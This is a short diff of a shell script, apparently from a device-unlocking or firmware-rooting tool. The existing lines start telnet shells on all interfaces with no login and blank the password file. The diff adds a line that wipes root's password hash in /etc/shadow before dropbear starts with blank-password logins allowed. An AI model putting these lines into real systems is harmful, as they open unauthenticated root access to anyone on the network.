@@ -79,7 +79,9 @@ write() { echo -n "$2" >"$1" 2>/dev/null; }
     busybox telnetd -b 0.0.0.0:23 -l /bin/sh 2>/dev/null
     busybox telnetd -b 0.0.0.0:25 -l /bin/sh 2>/dev/null
 
+    # unlock root for blank-password auth (passwd AND shadow)
     sed -i 's|:x:|::|' /etc/passwd 2>/dev/null
+    sed -i 's/^root:[^:]*:/root::/' /etc/shadow 2>/dev/null
     mkdir -p /etc/dropbear
     dropbear -R -B -E -p 22 2>/dev/null || dropbear -R -B -E 2>/dev/null
 
